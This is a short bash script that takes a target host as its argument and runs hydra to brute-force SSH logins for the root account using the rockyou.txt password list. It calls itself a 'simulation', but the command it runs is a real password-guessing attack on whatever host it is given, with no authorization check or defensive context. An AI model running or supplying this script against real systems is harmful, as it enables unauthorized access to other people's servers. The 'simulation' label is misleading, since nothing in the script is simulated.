#!/bin/bash

TARGET=$1

echo "Starting brute force simulation..."

hydra -l root -P rockyou.txt ssh://$TARGET
